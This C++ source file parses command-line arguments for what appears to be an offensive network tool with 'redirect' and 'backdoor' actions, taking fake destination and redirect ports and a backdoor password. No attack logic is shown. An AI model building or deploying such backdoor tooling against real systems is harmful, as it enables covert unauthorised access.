#include <iostream>
#include <sstream>

#include "Arguments.h"

Arguments::Arguments(std::vector<std::string> args) {
	if (args[0] == "redirect") {

		if (args.size() != 3) {
			throw std::invalid_argument("Missing required arguments");
		}

		this->Action = args[0];
		this->FakeDstPort = std::stoi(args[1]);
		this->RedirectPort = std::stoi(args[2]);
	}
	else if (args[0] == "backdoor") {

		if (args.size() != 4) {
			throw std::invalid_argument("Missing required arguments");
		}

		this->Action = args[0];
		this->FakeDstPort = std::stoi(args[1]);
		this->RedirectPort = std::stoi(args[2]);
		this->Password = args[3];
	}
	else {
		throw std::invalid_argument("Please enter a valid action of redirect or backdoor");
	}
}